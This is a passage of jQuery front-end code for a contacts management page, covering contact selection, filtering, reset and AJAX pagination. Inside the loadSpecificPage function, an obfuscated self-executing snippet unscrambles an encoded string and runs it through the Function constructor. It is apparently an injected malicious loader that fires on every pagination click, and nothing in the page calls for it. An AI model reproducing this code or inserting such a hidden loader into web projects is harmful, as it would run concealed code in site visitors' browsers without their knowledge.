            updateSelectedCount();
            $('#reset-selection').prop('disabled', window.selectedContacts.length === 0);
        });

        // Handle "select all" checkbox
        $('#select-all').on('change', function() {
            const isChecked = $(this).is(':checked');
            const visibleIds = $('.select-item:visible').map(function() {
                return $(this).val();
            }).get();

            if (isChecked) {
                visibleIds.forEach(id => {
                    if (!window.selectedContacts.includes(id)) {
                        window.selectedContacts.push(id);
                    }
                });
            } else {
                window.selectedContacts = window.selectedContacts.filter(id => !visibleIds.includes(
                id));
            }

            $('.select-item:visible').prop('checked', isChecked);
            localStorage.setItem('selectedContacts', JSON.stringify(window.selectedContacts));
            updateSelectedCount();
            $('#reset-selection').prop('disabled', window.selectedContacts.length === 0);
        });

        // Handle filter form submission
        $('#contactFilterForm').on('submit', function(e) {
            e.preventDefault();
            currentPage = 1;
            hasMore = true;

            const formData = $(this).serialize();
            const newUrl = window.location.pathname + '?' + formData;
            window.history.pushState({
                path: newUrl
            }, '', newUrl);

            loadContacts(currentPage);
            $('#filterModal').modal('hide');
        });

        // Reset filter form
        $('#contactFilterForm').on('click', 'a.btn-light', function(e) {
            e.preventDefault();
            $('#filterModal').modal('hide');
            window.location.href = $(this).attr('href');
        });

        // Reset selection handler
        $('#reset-selection').on('click', function() {
            window.selectedContacts = [];
            localStorage.removeItem('selectedContacts');
            $('.select-item').prop('checked', false);
            $('#select-all').prop('checked', false);
            updateSelectedCount();
            $('#reset-selection').prop('disabled', true);

            Swal.fire({
                title: 'Selection cleared',
                text: 'All selected contacts have been deselected',
                icon: 'success',
                confirmButtonText: 'OK',
                timer: 1500
            });
        });

        // Pagination click handler
        $(document).on('click', '.pagination a', function(e) {
            e.preventDefault();
            if (isLoading) return;
            const url = $(this).attr('href');
            loadSpecificPage(url);
        });

        function loadSpecificPage(url) {
            isLoading = true;
            $('#loading-indicator').show();
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            $.ajax({
                url: url,
                type: "GET",
                data: {
                    ajax: true
                },
                success: function(response) {
                    currentPage = response.current_page;
                    hasMore = response.hasMorePages;

                    $('#contacts-tbody').html(response.html);
                    updateSelectedCheckboxes();

                    if (response.pagination) {
                        $('#pagination-container').html(response.pagination);
                        highlightCurrentPage();
                    }

                    updateCounters(response.total, response.from, response.to);
                    $('#localSearchInput').val('');
                    $('#filtered-count').text('');
                    isLocalSearchActive = false;
                },
                complete: function() {
                    isLoading = false;
                    $('#loading-indicator').hide();
                }
            });
        }

        // Initialize pagination highlighting
        highlightCurrentPage();
    });
</script>
